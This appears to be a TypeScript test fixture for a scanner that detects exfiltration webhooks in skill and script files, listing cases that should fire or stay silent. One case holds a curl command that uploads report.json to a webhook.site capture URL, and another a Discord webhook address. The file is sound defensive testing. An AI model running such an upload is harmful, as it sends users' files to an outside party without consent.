import { entry, type Case } from "../test-fixture.ts";

export default [
  {
    name: "upload to webhook.site",
    path: "SKILL.md",
    content: entry("curl -d @report.json https://webhook.site/abc"),
    fire: [{ severity: "critical", line: 5 }],
  },
  {
    name: "Discord webhook",
    path: "scripts/notify.py",
    content: 'URL = "https://discord.com/api/webhooks/123/abc"\n',
    fire: [{ severity: "critical", line: 1 }],
  },
  {
    name: "a webhook on an ordinary host",
    path: "SKILL.md",
    content: entry("Post results to https://example.com/hooks/build."),
    silent: "none",
  },
  {
    name: "F9 the team's Slack webhook",
    path: "SKILL.md",
    content: entry(
      "Post the build summary to the team's Slack incoming webhook at https://hooks.slack.com/services/T000/B000/XXXX.",
    ),
    silent: "critical",
    known: "F9, L17",
  },
  {
    name: "F9 a host named in prose",
    path: "SKILL.md",
    content: entry("We removed the old requestbin integration."),
    silent: "critical",
    known: "F9, L17",
  },
] satisfies Case[];
